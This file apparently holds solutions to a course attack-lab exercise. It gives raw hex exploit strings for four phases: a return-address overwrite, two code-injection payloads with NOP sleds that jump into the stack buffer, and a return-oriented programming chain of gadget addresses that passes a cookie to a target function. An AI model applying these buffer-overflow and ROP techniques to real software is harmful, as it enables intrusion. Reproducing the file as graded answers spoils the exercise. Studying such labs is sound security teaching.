/*
phase 4
*/

90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
9f 14 40 00 00 00 00 00 /* address of pop cookie to rax - ret */
92 38 f1 4d 00 00 00 00 /* cookie */
91 14 40 00 00 00 00 00 /* adress of movl eax to edi - ret */
c4 12 40 00 00 00 00 00 /* return address of touch2 */


/*
phase 3

bf 00 91 64 55 c3 00 00 /* moves the address of the cookie string (Last line in this segment) */
90 90 90 90 90 90 90 90 /* */
90 90 90 90 90 90 90 90 /* */
90 90 90 90 90 90 90 90 /* */
90 90 90 90 90 90 90 90 /* */
90 90 90 90 90 90 90 90 /* */
90 90 90 90 90 90 90 90 /* */
b8 90 64 55 00 00 00 00 /* set the return address to the beginning of the buffer (the first line in this segment) */
d5 13 40 00 00 00 00 00 /* puts the address of touch3 on the stack */
34 64 66 31 33 38 39 32 /* text version of cookie */
*/

/*
phase 2

bf 92 38 f1 4d c3 00 00
00 00 00 00 00 00 00 00
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
b8 90 64 55 00 00 00 00
c4 12 40 00 00 00 00 00
*/

/*
phase 1

90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
98 12 40 00 00 00 00 00
*/

